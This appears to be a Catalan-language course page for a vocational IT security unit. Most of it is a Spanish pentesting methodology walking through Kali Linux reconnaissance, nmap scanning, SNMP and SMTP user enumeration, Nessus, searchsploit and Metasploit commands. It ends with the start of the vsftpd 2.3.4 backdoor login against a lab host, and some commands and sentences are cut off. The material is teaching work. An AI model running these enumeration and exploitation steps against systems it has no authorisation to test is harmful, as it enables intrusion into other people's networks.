---
layout: default
title: "UD8 — Atacs i Contramesures · Temari Complet"
course_root: ".."
badge: "2n SMX · Grau Mitjà · UD8 — Atacs i Contramesures"
prev_url: "../ut07/ut0701.html"
prev_label: "⬅️ 7.1 Monitoratge de xarxa, arquitectura de tallafocs (Firewalls), IPTables i servidors Proxy"
next_url: "../ut08/ut0801.html"
next_label: "8.1 Atacs TCP/IP (MITM), auditoria Wi-Fi (Aircrack-ng) i seguretat web (WebGoat) ➡️"
---

# 📘 UD8 — Atacs i Contramesures (Unitat Completa)

> **💡 Temari Complet de la Unitat**
> Aquesta pàgina integra tots els apartats teòrics de la unitat didàctica en una sola lectura contínua.

## 📑 Índex d'Apartats d'aquesta Unitat

- [**8.1 Atacs TCP/IP (MITM), auditoria Wi-Fi (Aircrack-ng) i seguretat web (WebGoat)**](./ut0801.md)
- [**8.2 Metodologia de Pentesting i Kali Linux**](./ut0802.md)

---

# 8.1 Atacs TCP/IP (MITM), auditoria Wi-Fi (Aircrack-ng) i seguretat web (WebGoat)

### Seguretat Informàtica

- 08 - Atacs i contramesures

### Continguts

- 13
- hores
- Unitat 8
- Atacs i contramesures

### Atacs TCP/IP: MITM

### Atacs wifi: Aircrack-ng

### Atacs web: WebGoat

### Atacs proxy: Ultrasurf

---

# 8.2 Metodologia de Pentesting i Kali Linux

### 1. Metodología de una Prueba de Penetración

Una Prueba de Penetración (Penetration Testing) es el proceso utilizado para realizar una evaluación o auditoría de seguridad de alto nivel. Una metodología define un conjunto de reglas, prácticas, procedimientos y métodos a seguir e implementar durante la realización de cualquier programa para auditoría en seguridad de la información. Una metodología para pruebas de penetración define una hoja de ruta con ideas útiles y prácticas comprobadas, las cuales deben ser manejadas cuidadosamente para poder evaluar correctamente los sistemas de seguridad.

1.1 Tipos de Pruebas de Penetración: Existen diferentes tipos de Pruebas de Penetración, las más comunes y aceptadas son las Pruebas de Penetración de Caja Negra (Black-Box), las Pruebas de Penetración de Caja Blanca (White-Box) y las Pruebas de Penetración de Caja Gris (Grey-Box).

• Prueba de Caja Negra. No se tienen ningún tipo de conocimiento anticipado sobre la red de la organización. Un ejemplo de este escenario es cuando se realiza una prueba externa a nivel web, y está es realizada únicamente con el detalle de una URL o dirección IP proporcionado al equipo de pruebas. Este escenario simula el rol de intentar irrumpir en el sitio web o red de la organización. Así mismo simula un ataque externo realizado por un atacante malicioso.

• Prueba de Caja Blanca. El equipo de pruebas cuenta con acceso para evaluar las redes, y se le ha proporcionado los de diagramas de la red, además de detalles sobre el hardware, sistemas operativos, aplicaciones, entre otra información antes de realizar las pruebas. Esto no iguala a una prueba sin conocimiento, pero puede acelerar el proceso en gran magnitud, con el propósito de obtener resultados más precisos. La cantidad de conocimiento previo permite realizar las pruebas contra sistemas operativos específicos, aplicaciones y dispositivos residiendo en la red, en lugar de invertir tiempo enumerando aquello lo cual podría posiblemente estar en la red. Este tipo de prueba equipara una situación donde el atacante puede tener conocimiento completo sobre la red interna.

• Prueba de Caja Gris El equipo de pruebas simula un ataque realizado por un miembro de la organización inconforme o descontento. El equipo de pruebas debe ser dotado con los privilegios adecuados a nivel de usuario y una cuenta de usuario, además de permitirle acceso a la red interna.

La principal diferencia entre una evaluación de vulnerabilidades y una prueba de penetración, radica en el hecho de las pruebas de penetración van más allá del nivel donde únicamente de identifican las vulnerabilidades, y van hacia el proceso de su explotación, escalado de privilegios, y mantener el acceso en el sistema objetivo. Mientras una evaluación de vulnerabilidades proporciona una amplia visión sobre las fallas existentes en los sistemas, pero sin medir el impacto real de estas vulnerabilidades para los sistemas objetivos de la evaluación 1.3 Metodologías de Pruebas de Seguridad Existen diversas metodologías open source, o libres las cuales tratan de dirigir o guiar los requerimientos de las evaluaciones en seguridad. La idea principal de utilizar una metodología durante una evaluación, es ejecutar diferentes tipos de pruebas paso a paso, para poder juzgar con una alta precisión la seguridad de los sistemas. Entre estas metodologías se enumeran las siguientes

### 2. Máquinas Vulnerables

2.1 Maquinas Virtuales Vulnerables Nada puede ser mejor a tener un laboratorio donde practicar los conocimientos adquiridos sobre Pruebas de Penetración. Esto aunado a la facilidad proporciona por el software para realizar virtualización, lo cual hace bastante sencillo crear una máquina virtual vulnerable personalizada o descargar desde Internet una máquina virtual vulnerable.

A continuación se detalla un breve listado de algunas máquinas virtuales creadas específicamente conteniendo vulnerabilidades, las cuales pueden ser utilizadas para propósitos de entrenamiento y aprendizaje en temas relacionados a la seguridad, hacking ético, pruebas de penetración, análisis de vulnerabilidades, forense digital, etc.

• Metasploitable 3 Enlace de descarga: https://github.com/rapid7/metasploitable3 • Metasploitable2 Enlace de descarga: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ • Metasploitable Enlace de descarga: https://www.vulnhub.com/entry/metasploitable-1,28/ Vulnhub proporciona materiales que permiten a cualquier interesado ganar experiencia práctica en seguridad digital, software de computadora y administración de redes. Incluye un extenso catálogo de maquinas virtuales y “cosas” las cuales se pueden de manera legal; romper, “hackear”, comprometer y explotar.

### 3. Introducción a Kali Linux

Kali Linux es una distribución basada en GNU/Linux Debian, destinado a auditorias de seguridad y pruebas de penetración avanzadas. Kali Linux contiene cuentos de herramientas, las cuales están destinadas hacia varias tareas en seguridad de la información, como pruebas de penetración, investigación en seguridad, forense de computadoras, e ingeniería inversa. Kali Linux ha sido desarrollado, fundado y mantenido por Offensive Security, una compañía de entrenamiento en seguridad de la información.

Kali Linux fue publicado en 13 de marzo del año 2013, como una reconstrucción completa de BackTrack Linux, aderiéndose completamente con los estándares del desarrollo de Debian. Este documento proporciona una excelente guía práctica para utilizar las herramientas más populares incluidas en Kali Linux, las cuales abarcan las bases para realizar pruebas de penetración. Así mismo este documento es una excelente fuente de conocimiento tanto para profesionales inmersos en el tema, como para los novatos.

El Sitio Oficial de Kali Linux es: http

s ://www.kali.org/ 3.1 Características de Kali Linux Kali Linux es una completa reconstrucción de BackTrack Linux, y se adhiere completamente a los estándares de desarrollo de Debian. Se ha puesto en funcionamiento toda una nueva infraestructura, todas las herramientas han sido revisadas y empaquetadas, y se utiliza ahora Git para el VCS.

• Incluye más de 600 herramientas para pruebas de penetración • Es Libre y siempre lo será • Árbol Git Open Source • Cumplimiento con FHS (Filesystem Hierarchy Standard) • Amplio soporte para dispositivos inalámbricos • Kernel personalizado, con parches para inyección. • Es desarrollado en un entorno seguro • Paquetes y repositorios están firmados con GPG • Soporta múltiples lenguajes • Completamente personalizable • Soporte ARMEL y ARMHF Kali Linux está específicamente diseñado para las necesidades de los profesionales en pruebas de penetración, y por lo tanto toda la documentación asume un conocimiento previo, y familiaridad con el sistema operativo Linux en general.

Kali Linux puede ser descargado como imágenes ISO para computadoras basadas en Intel, esto para arquitecturas de 32-bits o 64 bits. También puede ser descargado como máquinas virtuales previamente construidas para VMware Player, VirtualBox y Hyper-V. Finalmente también existen imágenes para la arquitectura ARM, los cuales están disponibles para una amplia diversidad de dispositivos.

Kali Linux puede ser descargado desde la siguiente página: https://www.kali.org/downloads/ 3.3 Instalación de Kali Linux Kali Linux puede ser instalado en un un disco duro como cualquier distribución GNU/Linux, también puede ser instalado y configurado para realizar un arranque dual con un Sistema Operativo Windows, de la misma manera puede ser instalado en una unidad USB, o instalado en un disco cifrado.

Se sugiere revisar la información detallada sobre las diversas opciones de instalación para Kali Linux, en la siguiente página: http://docs.kali.org/category/installation 3.4 Cambiar la Contraseña del root Por una buena práctica de seguridad se recomienda cambiar la contraseña por defecto asignada al usuario root. Esto dificultará a los usuarios maliciosos obtener acceso hacia sistema con esta clave por defecto.

```bash
# passwd root
```

De requerirse iniciar el servicio HTTP se debe ejecutar el siguiente comando

```bash
# service apache2 start
```

Estos servicios también pueden iniciados y detenidos desde el menú: Applications -> Kali Linux -> System Services. Kali Linux proporciona documentación oficial sobre varios de sus aspectos y características. La documentación está en constante trabajo y progreso. Esta documentación puede ser ubicada en la siguiente página

### 4. Shell Scripting

El Shell es un interprete de comandos. Más a únicamente una capa aislada entre el Kernel del sistema operativo y el usuario, es también un poderoso lenguaje de programación. Un programa shell llamado un script, es un herramienta fácil de utilizar para construir aplicaciones “pegando” llamadas al sistema, herramientas, utilidades y archivos binarios. El Shell Bash permite automatizar una acción, o realizar tareas repetitivas las cuales consumen una gran cantidad de tiempo.

Para la siguiente práctica se utilizará un sitio web donde se publican listados de proxys. Utilizando comandos del shell bash, se extraerán las direcciones IP y puertos de los Proxys hacia un archivo.

```bash
# wget http://www.us-proxy.org/
# grep "<tr><td>" index.html | cut -d ">" -f 3,5 | cut -d "<" -f 1,2 | sed
```

### 5. Capturar Información

En esta fase se intenta recolectar la mayor cantidad de información posible sobre el objetivo en evaluación, como posibles nombres de usuarios, direcciones IP, servidores de nombre, y otra información relevante. Durante esta fase cada fragmento de información obtenida es importante y no debe ser subestimada. Tener en consideración, la recolección de una mayor cantidad de información, generará una mayor probabilidad para un ataque satisfactorio.

El proceso donde se captura la información puede ser dividido de dos maneras. La captura de información activa y la captura de información pasiva. En el primera forma se recolecta información enviando tráfico hacia la red objetivo, como por ejemplo realizar ping ICMP, y escaneos de puertos TCP/UDP. Para el segundo caso se obtiene información sobre la red objetivo utilizando servicios o fuentes de terceros, como por ejemplo motores de búsqueda como Google y Bing, o utilizando redes sociales como Facebook o LinkedIn.

5.1 Fuentes Públicas Existen diversos recursos públicos en Internet , los cuales pueden ser utilizados para recolectar información sobre el objetivo en evaluación. La ventaja de utilizar este tipo de recursos es la no generación de tráfico directo hacia el objetivo, de esta manera se minimizan la probabilidades de ser detectados. Algunas fuentes públicas de referencia son

Metagoofil realizará una búsqueda en Google para identificar y descargar documentos hacia el disco local, y luego extraerá los metadatos con diferentes librerías como Hachoir, PdfMiner y otros. Con los resultados se generará un reporte con los nombres de usuarios, versiones y software, y servidores o nombres de las máquinas, las cuales ayudarán a los profesionales en pruebas de penetración en la fase para la captura de información.

```bash
# metagoofil
# metagoofil -d nmap.org -t pdf -l 200 -n 10 -o /tmp/ -f
```

/tmp/resultados_mgf.html La opción “-d” define el dominio a buscar. La opción “-t” define el tipo de archivo a descargar (pdf, doc, xls, ppt, odp, ods, docx, pptx, xlsx) La opción “-l” limita los resultados de búsqueda (por defecto a 200). La opción “-n” limita los archivos a descargar.

Realizando actualmente las siguientes operaciones: Obtener las direcciones IP del host (Registro A). Obtener los servidores de nombres. Obtener el registro MX. Realizar consultas AXFR sobre servidores de nombres y versiones de BIND. Obtener nombres adicionales y subdominios mediante Google (“allinurl -www site:dominio”). Fuerza bruta a subdominios de un archivo, puede también realizar recursividad sobre subdominios los cuales tengan registros NS. Calcular los rangos de red de dominios en clase y realizar consultas whois sobre ellos. Realizar consultas inversas sobre rangos de red (clase C y/o rangos de red). Escribir hacia un archivo domain_ips.txt los bloques IP.

```bash
# cd /usr/share/dnsenum/
# dnsenum --enum hackthissite.org
```

```bash
# fierce --help
# fierce -dnsserver d.ns.buddyns.com -dns hackthissite.org -wordlist
```

/usr/share/dnsenum/dns.txt -file /tmp/resultado_fierce.txt La opción “-dnsserver” define el uso de un servidor DNS en particular para las consultas del nombre del host. La opción “-dns” define el dominio a escanear. La opción “-wordlist” define una lista de palabras a utilizar para descubrir subdominios.

```bash
# dmitry
# dmitry -w -e -n -s [Dominio] -o /tmp/resultado_dmitry.txt
```

Imagen 5-4. Información de Netcraft y de los subdominios encontrados. Aunque existe una opción en Dmitry, la cual permitiría obtener información sobre el dominio desde el sitio web de Netcraft, ya no es funcional. Pero la información puede ser obtenida directamente desde el sitio web de Netcraft.

El único parámetro requerido es el nombre o dirección IP del host de destino. La longitud del paquete opcional es el tamaño total del paquete de prueba (por defecto 60 bytes para IPv4 y 80 para IPv6). El tamaño especificado puede ser ignorado en algunas situaciones o incrementado hasta un valor mínimo.

La versión de traceroute en los sistemas GNU/Linux utiliza por defecto paquetes UDP.

```bash
# traceroute --help
```

```bash
# traceroute [Dirección_IP]
```

Imagen 5-6. traceroute en funcionamiento. (Los nombres de host y direcciones IP han sido censurados conscientemente) tcptraceroute https://linux.die.net/man/1/tcptraceroute tcptraceroute es una implementación de la herramienta traceroute, la cual utiliza paquetes TCP para trazar la ruta hacia el host objetivo. Traceroute tradicionalmente envía ya sea paquetes UDP o paquetes ICMP ECHO con un TTL a uno, e incrementa el TTL hasta el destino sea alcanzado.

```bash
# tcptraceroute --help
# tcptraceroute [Dirección_IP]
```

Las fuentes son; Treatcrowd, crtsh, google, googleCSW, google-profiles, bing, bingapi, dogpile, pgp, linkein, vhost, twitter, googleplus, yahoo, baidu, y shodan.

```bash
# theharvester
# theharvester -d nmap.org -l 200 -b bing
```

### 6. Descubrir el Objetivo

Después de recolectar la mayor cantidad de información sobre la red objetivo desde fuentes externas; como motores de búsqueda; es necesario descubrir ahora las máquinas activas en el objetivo de evaluación. Es decir encontrar cuales son las máquinas disponibles o en funcionamiento, caso contrario no será posible continuar analizándolas, y se deberá continuar con la siguientes máquinas.

También se debe obtener indicios sobre el tipo y versión del sistema operativo utilizado por el objetivo. Toda esta información será de mucha ayuda para el proceso donde se deben mapear las vulnerabilidades. 6.1 Identificar la máquinas del objetivo nmap https://nmap.org/ Nmap “Network Mapper” o Mapeador de Puertos, es una herramienta open source para la exploración de redes y auditorías de seguridad. Nmap utiliza paquetes IP en bruto de maneras novedosas para determinar cuales host están disponibles en la red, cuales servicios (nombre y versión) estos hosts ofrecen, cuales sistemas operativos (y versión de SO) están ejecutándo, cual tipo de firewall y filtros de paquetes utilizan. Ha sido diseñado para escanear velozmente redes de gran envergadura, consecuentemente funciona también host únicos.

```bash
# nmap -h
# nmap -sn [Dirección_IP]
# nmap -n -sn 192.168.0.0/24
```

La opción “-n” le indica a nmap a no realizar una resolución inversa al DNS sobre las direcciones IP activas que encuentre. Nota: Cuando un usuario privilegiado intenta escanear objetivos sobre una red ethernet local, se utilizan peticiones ARP, a menos sea especificada la opción “--send-ip”, la cual indica a nmap a enviar paquetes mediante sockets IP en bruto, en lugar de tramas ethernet de bajo nivel.

```bash
ping para detectar host activos, también puede ser utilizada como un generador de paquetes en bruto
```

para pruebas de estrés para la pila de red, envenenamiento del cache ARP, ataque para la negación de servicio, trazado de la red, ec. Nping también permite un modo eco novato, lo cual permite a los usuarios ver como los paquetes cambian en tránsito entre los host de origen y de destino. Esto es muy bueno para entender las reglas del firewall, detectar corrupción de paquetes, y más.

```bash
# nping -h
# nping [Dirección_IP]
```

Imagen 6-2. nping enviando tres paquetes ICMP Echo Request nping utiliza por defecto el protocolo ICMP. En caso el host objetivo esté bloqueando este protocolo, se puede utilizar el modo de prueba TCP.

```bash
# nping --tcp [Dirección_IP]
```

nmap https://nmap.org/ Una de las características mejores conocidas de Nmap es la detección remota del Sistema Operativo utilizando el reconocimiento de la huella correspondiente a la pila TCP/IP. Nmap envía un serie de paquetes TCP y UDP hacia el host remoto y examina prácticamente cada bit en las respuestas.

Después de realizar docenas de pruebas como muestreo ISN TCP, soporte de opciones TCP y ordenamiento, muestreo ID IP, y verificación inicial del tamaño de ventana, Nmap compara los resultados con su base de datos, la cual incluye más de 2,600 huellas para Sistemas Operativos conocidos, e imprime los detalles del Sistema Operativo si existe una coincidencia.

Detección del Sistema Operativo (Nmap): https://nmap.org/book/man-os-detection.html

```bash
# nmap -O [Dirección_IP]
```

Imagen 6-3. Información del Sistema Operativo de Metasploitable2, obtenidos por nmap. p0f http://lcamtuf.coredump.cx/p0f3/ P0f es una herramienta la cual utiliza un arreglo de mecanismos sofisticados puramente pasivas de tráfico, para identificar los implicados detrás de cualquier comunicación TCP/IP incidental (frecuentemente algo tan pequeño como un SYN normal, sin interferir de ninguna manera. La versión 3 es una completa rescritura del código base original, incorporando un número significativo de mejoras para el reconocimiento de la huella a nivel de red, y presentado la capacidad de razonar sobre las cargas útiles a nivel de aplicación (por ejemplo HTTP).

```bash
# p0f -h
# p0f -i [Interfaz] -d -o /tmp/resultado_p0f.txt
```

La opción “-i” le indica a p0f3 atender en la interfaz de red especificada. La opción “-d” genera un bifurcación en segundo plano, esto requiere usar la opción “-o” o “-s”. La opción “-o” escribe la información capturada a un archivo de registro especifico. Imagen 6-4. Instalación satisfactorio de p0f.

```bash
# echo -e "HEAD / HTTP/1.0\r\n" | nc -n [Dirección _IP] 80
```

### 7. Enumerar el Objetivo

La enumeración es el procedimiento utilizado para encontrar y recolectar información desde los puertos y servicios disponibles en el objetivo de evaluación. Usualmente este proceso se realiza luego de descubrir el entorno mediante el escaneo para identificar los hosts en funcionamiento.

Usualmente este proceso se realiza al mismo tiempo del proceso de descubrimiento. 7.1 Escaneo de Puertos. Teniendo conocimiento del rango de la red y las máquinas activas en el objetivo de evaluación, es momento de proceder con el escaneo de puertos para obtener un listado de los puertos TCP y UDP en estado abierto o de atención.

Existen diversas técnicas para realizar el escaneo de puertos, entre las más comunes se enumeran las siguientes: Escaneo TCP SYN Escaneo TCP Connect Escaneo TCP ACK Escaneo UDP nmap https://nmap.org/ Muchos de los tipos de escaneo con Nmap están únicamente disponibles para usuarios privilegiados.

Esto es porque se envía y recibe paquetes en bruto, lo cual requiere acceso como root en sistemas Linux. Usando una cuenta administrador en Windows es recomendado, aunque Nmap algunas veces funciona para usuarios no privilegiados sobre una plataforma cuando WinPcap ya ha sido cargado en el Sistema Operativo.

Mientras Nmap intenta producir resultados precisos, se debe considerar todos el conocimiento se basan en los paquetes retornados por los máquinas objetivos (o firewalls en frente de estos). Tales hosts pueden ser poco fiables, y enviar respuestas destinadas a confundir a Nmap. Muchos más comunes son los hosts no compatibles con el RFC, los cuales no responden como deberían a las pruebas de Nmap. Los escaneos FIN, NULL, y Xmas son particularmente susceptibles a este problema. Tales problemas son específicos hacia ciertos tipos de escaneo.

Por defecto nmap utiliza un escaneo SYN, pero este es substituido por un escaneo Connect si el usuario no tiene los privilegios necesarios para enviar paquetes en bruto. Además de no especificarse los puertos, se escanean los 1,000 puertos más populares. Técnicas para el Escaneo de Puertos (Nmap)

```bash
# nmap [Dirección_IP]
```

Imagen 7-1. Información obtenida con una escaneo por defecto utilizando nmap Para definir un conjunto de puertos a escanear contra un objetivo, se debe utilizar la opción “-p” de nmap, seguido de la lista de puertos o rango de puertos.

```bash
# nmap -p1-65535 [Dirección_IP]
# nmap -p 80 192.168.1.0/24
# nmap -p 80 192.168.1.0/24 -oA /tmp/resultado_nmap_p80.txt
```

zenmap https://nmap.org/zenmap/ Zenmap es un GUI (Interfaz Gráfica de Usuario) oficial para el escaner Nmap. Es una aplicación libre multiplataforma (Linux, Windows, Mac OS X, BSD, etc) y open source, el cual facilita el uso de nmap a los principiantes, a la vez de proporcionar características avanzadas para los usuarios más experimentados. Frecuentemente los escaneos utilizados pueden ser guardados como perfiles para hacerlos más fáciles de ejecutar repetidamente. Un creador de comandos permite la creación interactiva de líneas de comando para Nmap. Los resultados de Nmap pueden ser guardados y vistos posteriormente. Los escaneos guardados pueden ser comparados, para ver si difieren. Los resultados de los escaneos recientes son almacenados en una base de datos factible de ser buscada.

Después de descubrir los puertos TCP y UDP utilizando algunos de los escaneos proporcionados por Nmap, la detección de versiones interroga estos puertos para determinar más sobre lo cual está actualmente en funcionamiento. La base de datos de Nmap contiene pruebas para consultar diversos servicios y expresiones de correspondencia para reconocer e interpretar las respuestas. Nmap intenta determinar el protocolo del servicio(por ejemplo, FTP, SSH, Telnet, HTTP), el nombre de la aplicación (por ejemplo, ISC BIND, Apache httpd, Solaris telnetd ), el número de versión, nombre del host, tipo de dispositivo (ejemplo, impresora, encaminador), familia del sistema operativo (ejemplo, Windows, Linux).

Detección de Servicios y Versiones (Nmap): https://nmap.org/book/man-version-detection.html

```bash
# nmap -sV [Dirección_IP]
```

```bash
# amap -h
# amap -bq [Dirección_IP] 1-100
```

La enumeración SNMP permite realizar este procedimiento pero utilizado el protocolo SNMP, lo cual puede permitir obtener información como software instalado, usuarios, tiempo de funcionamiento del sistema, nombre del sistema, unidades de almacenamiento, procesos en ejecución y mucha más información.

```bash
# sudo /etc/init.d/snmp start
```

snmpwalk https://linux.die.net/man/1/snmpwalk snmpwalk es una aplicación SNMP la cual utiliza peticiones GETNEXT para consultar una entidad de red por un árbol de información. Un OID (Object IDentifier) o Identificador de Objeto puede ser definido en la línea de comando. Este OID especifica cual porción del espacio del identificar de objetivo será buscado utilizando peticiones GETNEXT. Todas las variables en la rama a continuación del OID definido son consultados, y sus valores presentados al usuario.

Si no se especifica un argumento OID, snmpwalk buscará la rama raíz en SNMPv2-SMI::mib-2 (incluyendo cualquier valores de objeto MIB desde otros módulos MIB, los cuales son definidos como pertenecientes a esta rama). Si la entidad de red tiene un error procesando el paquete de petición será retornado y un mensaje será mostrado, lo cual ayuda a identificar porque la solicitud se construyó incorrectamente.

Un OID es un mecanismo de identificación extensamente utilizado desarrollado, para nombrar cualquier tipo de objeto, concepto o “cosa” con nombre globalmente no ambiguo , el cual requiere un nombre persistente (largo tiempo de vida). Este no es está destino a ser utilizado para nombramiento transitorio. Los OIDs, una vez asignados, no puede ser reutilizados para un objeto o cosa diferente.

Se puede obtener más información en el Repositorio de Identificadores de Objetos (OID): http://www.oid-info.com/

```bash
# snmpwalk -h
# snmpwalk -c public [Dirección_ IP] -v 2c
```

La opción “-v” de snmpwalk especifica la versión de SNMP a utilizar. Imagen 7-6. Información obtenida por snmpwalk snmpcheck http://www.nothink.org/codes/snmpcheck/index.php Snmpcheck es una herramienta open source distribuida bajo la licencia GPL. Su objetivo es automatizar el proceso de recopilar información de cualquier dispositivo con soporte al protocolo SNMP (Windows, Linux, appliances de red, impresoras, etc.). Como snmpwalk, snmpcheck permite enumerar dispositivos SNMP y pone la salida en una formato amigable para los seres humanos.

Pudiendo ser útil para pruebas de penetración o vigilancia de sistemas.

```bash
# snmpcheck -h
```

```bash
# snmpcheck -t [Dirección_IP]
```

La opción “-t” de snmpcheck define el host objetivo. También es factible utilizar la opción “-v” para definir la versión 1 o 2 de SNMP. Imagen 7-7. Iniciando la ejecución de snmpcheck contra Metasploitable2 smtp user enum http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum smtp-user-enum es una herramienta para enumerar cuentas de usuario a nivel del sistema operativo mediante un servicio SMTP (sendmail). La enumeración se realiza mediante la inspección de las respuestas a comandos VRFY, EXPN y RCTP TO. Esto podría ser adaptado para funcionar contra otros demonios SMTP vulnerables.

```bash
# smtp-user-enum -h
# smtp-user-enum -M VRFY -U /usr/share/metasploit-
```

framework/data/wordlists/unix_users.txt -t [Dirección_IP] La opción ”-M” de smtp-user-enum define el método a utilizar para adivinar los nombre de usuarios. El método puede ser (EXPN, VRFY o RCPT), por defecto se utiliza VRFY. La opción “-U” permite definir un archivo conteniendo los nombres de usuario a verificar mediante el servicio SMTP.

El archivo de nombre “unix_users.txt” es un listado de nombres de usuarios comunes en un sistema tipo Unix. En el directorio /usr/share/metasploit-framework/data/wordlists/ se pueden encontrar más listas de palabras de valiosa utilidad para diversos tipos de pruebas.

### 8. Mapear Vulnerabilidades

La tarea de mapear vulnerabilidades consiste en identificar y analizar las vulnerabilidades en los sistemas de la red objetivo. Cuando se ha completado los procedimientos de captura, descubrimiento, y enumeración de información, es momento de identificar las vulnerabilidades. La identificación de vulnerabilidades permite conocer cuales son las vulnerabilidades para las cuales el objetivo es susceptible, y permite realizar un conjunto de ataques más pulido.

8.1 Vulnerabilidad Local Una vulnerabilidad local es aquella donde un atacante requiere acceso local previo para explotar una vulnerabilidad, ejecutando una pieza de código. Al aprovecharse de este tipo de vulnerabilidad un atacante puede elevar o escalar sus privilegios, para obtener acceso sin restricción en el sistema objetivo.

8.2 Vulnerabilidad Remota Una Vulnerabilidad Remota es aquella en la cual el atacante no tiene acceso previo, pero la vulnerabilidad puede ser explotada a través de la red. Este tipo de vulnerabilidad permite al atacante obtener acceso a un sistema objetivo sin enfrentar ningún tipo de barrera física o local.

Nessus Vulnerability Scanner https://www.tenable.com/products/nessus/nessus-professional Nessus Professional es una solución para evaluaciones más ampliamente desplegada a nivel mundial, la cual permite identificar vulnerabilidades, problemas de configuración, y malware, lo cual es utilizado por los atacantes para penetrar la red o a los usuarios. Con amplio alcance, la última inteligencia, actualizaciones rápidas, y una interfaz rápida, Nessus ofrece un paquete para el escaneo de vulnerabilidades efectiva y completa a bajo costo.

Nessus Home permite escanear una red casera personal (hasta 16 direcciones IP por escaner) con la misma velocidad, evaluaciones profundas y conveniencia de escaneo sin agente, la cual disfrutan los subscriptores de Nessus. Nesus Home: https://www.tenable.com/products/nessus-home Descargar Nessus desde la siguiente página

```bash
# dpkg -i [Nombre del paquete]
```

Para iniciar el demonio de Nessus se debe ejecutar el siguiente comando

```bash
# /opt/nessus/sbin/nessus-service -q -D
```

También se puede utilizar el siguiente comando, para iniciar Nessus

```bash
# service nessusd start
```

Una vez que finalizada la instalación de nessus y la ejecución del servidor, abrir la siguiente URL en un navegador web. https://127.0.0.1:8834 Para actualizar los plugins de Nessus se debe utilizar los siguientes comandos.

```bash
# cd /opt/nessus/sbin
# ./nessus-update-plugins
```

Directivas o Políticas Una directiva de Nessus está compuesta por opciones de configuración las se relacionan con la realización de un análisis de vulnerabilidades. Se puede obtener más información sobre como crear un directiva en Nessus y obtener información detallada sobre esta, en la siguiente página

Un documento conteniendo información muy valiosa y útil es la Guía de Usuario de Nessus versión 7.1 en idioma inglés, el cual puede ser descargado visualizado en la siguiente página: https://docs.tenable.com/nessus/7_1/Content/GettingStarted.htm Otro documento igualmente importante es la Guía de Instalación y Configuración de Nessus versión 6.4 en idioma inglés, el cual puede ser descargado desde la siguiente página

Los NSE han sido diseñados para ser versátiles, con las siguientes tareas en mente; descubrimiento de la red, detección más sofisticada de las versiones, detección de vulnerabilidades, detección de puertas traseras (backdoors), y explotación de vulnerabilidades. Los scripts están escritos en el lengua de programación LUA.

Nmap Scripting Engine: https://nmap.org/book/nse.html Para realizar un escaneo utilizando todos los NSE de la categoría “vuln” o vulnerabilidades utilizar el siguiente comando.

```bash
# nmap -n -Pn --script vuln 192.168.0.16
```

La opción “--script” le indica a Nmap realizar un escaneo de scripts utilizando una lista de nombres de archivos separados por comas, categorías de scripts, o directorios. Cada elemento en la lista puede también ser una expresión boolean describiendo un conjunto de scripts más complejo.

### 9. Explotar el Objetivo

Luego de haber descubierto las vulnerabilidades en los hosts o red objetivo, es momento de intentar explotarlas. La fase de explotación algunas veces finaliza el proceso de la Prueba de Penetración, pero esto depende del contrato, pues existen situaciones donde se debe ingresar de manera más profunda en la red objetivo, esto con el propósito de expandir el ataque por toda la red y ganar todos los privilegios posibles.

9.1 Repositorios con Exploits Todos los días se reportan diversos tipos de vulnerabilidades, pero en la actualidad solo una pequeña parte de ellas son expuestas o publicadas de manera gratuita. Algunos de estos “exploits”, puede ser descargados desde sitios webs donde se mantienen repositorios de ellos. Algunas de estas páginas se detallan a continuación.

• Exploit DataBase by Offensive Security: https://www.exploit-db.com/ • 0day.today: https://0day.today/ • Packet Storm: https://packetstormsecurity.com/files/tags/exploit/ • Vulnerability & Exploit Database: https://www.rapid7.com/db • SecurityFocus: https://www.securityfocus.com/vulnerabilities • VulDB: https://vuldb.com/ • Exploit Database: https://cxsecurity.com/exploit/ Kali Linux mantiene un repositorio local de exploits de “Exploit-DB”. Esta base de datos local tiene un script de nombre “searchsploit”, el cual permite realizar búsquedas dentro de esta base de datos local.

```bash
# searchsploit -h
# searchsploit vsftpd
```

```bash
# cd /usr/share/exploitdb/
# ls
# cd platforms/unix/remote
# less 17491.rb
```

Incluye una amplio arreglo de exploits con grado comercial, y un amplio entorno para el desarrollo de exploits, permite utilizar herramientas para capturar información, como herramientas para la fase posterior a la explotación. Eso hace a MSF un entorno verdaderamente impresionante.

La consola de Metasploit Framework La consola de Metasploit (msfconsole) es principalmente utilizado para manejar la base de datos de Metasploit, manejar las sesiones, además de configurar y ejecutar los módulos de Metasploit. Su propósito esencial es la explotación. Esta herramienta permite conectarse hacia objetivo de tal manera se puedan ejecutar los exploits contra este.

Dado el hecho Metasploit Framework utiliza PostgreSQL como su Base de Datos, esta debe ser iniciada primero, para luego iniciar la consola de Metasploit Framework.

```bash
# service postgresql start
```

Para verificar que el servicio se ha iniciado correctamente se debe ejecutar el siguiente comando.

```bash
# netstat -tna | grep 5432
```

Para mostrar la ayuda Metasploit Framework.

```bash
# msfconsole -h
# msfconsole
```

```bash
# msfcli -h
# msfcli
```

```bash
# msfcli [Ruta Exploit] [Opción = Valor]
```

El el siguiente ejemplo se utilizar el módulo auxiliar de nombre “MySQL Server Version Enumeration”. El cual permite enumerar la versión de servidores MySQL. Muestra las opciones avanzadas del módulo

```bash
# msfcli auxiliary/scanner/mysql/mysql_version A
```

Muestra un resumen del módulo

```bash
# msfcli auxiliary/scanner/mysql/mysql_version S
```

Lista las opciones disponibles del módulo

```bash
# msfcli auxiliary/scanner/mysql/mysql_version O
```

Ejecutar el módulo auxiliar contra Metasploitable2

```bash
# msfcli auxiliary/scanner/mysql/mysql_version RHOSTS=192.168.0.16 E
```

Una vez obtenido acceso hacia objetivo de evaluación, se puede utilizar Meterpreter para entregar Payloads (Cargas Útiles). Se utiliza MSFCONSOLE para manejar las sesiones, mientras Meterpreter es la carga actual y tiene el deber de realizar la explotación. Algunos de los comando comúnmente utilizados con Meterpreter son

Un atacante remoto sin autenticación puede explotar esta vulnerabilidad para ejecutar código arbitrario como root. root@kali:~# ftp 192.168.1.34 Connected to 192.168.1.34. 220 (vsFTPd 2.3.4) Name (192.168.1.34:root): usuario:) 331 Please specify the password. Password

